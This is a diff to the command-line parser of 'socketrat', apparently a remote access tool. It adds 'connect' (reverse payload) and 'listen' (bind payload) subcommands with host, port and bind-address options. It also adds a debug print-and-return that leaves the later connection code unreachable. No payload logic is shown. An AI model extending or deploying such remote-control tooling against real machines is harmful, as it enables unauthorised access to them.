@@ -91,25 +91,44 @@ def _linux_main(args):
 
     parser = argparse.ArgumentParser()
     subparsers = parser.add_subparsers(
-            dest='subcommand',
-            #metavar='subcommand',
+            dest='command',
+            help='commands',
     )
     subparsers.required = True
 
-    connect_parser = subparsers.add_parser('connect')
+    connect_parser = subparsers.add_parser('connect',
+            help='Connect to a socketrat server [reverse payload]'
+    )
     connect_parser.add_argument('host',
-            help='The host name or ip address to connect to '
+            help='Specify alternate hostname or IP address '
                  '[default: localhost]',
             default='localhost',
             nargs='?',
     )
-    connect_parser.add_argument('--port', '-p',
-            help='The port number to connect to '
-                 '[default: 8000]',
+    connect_parser.add_argument('port',
+            help='Specify alternate port [default: 8000]',
             default=8000,
+            nargs='?',
+    )
+
+    listen_parser = subparsers.add_parser('listen',
+            help='Listen for connections from a socketrat server [bind payload]',
+    )
+    listen_parser.add_argument('--bind', '-b',
+            help='Specify alternate bind address [default: all interfaces]',
+            metavar='ADDRESS',
+            default='0.0.0.0',
+    )
+    listen_parser.add_argument('port',
+            help='Specify alternate port [default: 8000]',
+            default=8000,
+            nargs='?',
     )
 
     args = parser.parse_args(args)
+    print(args)
+    return
+
     host, port = addr = args.host, args.port
 
     with ReverseClient(addr) as client:
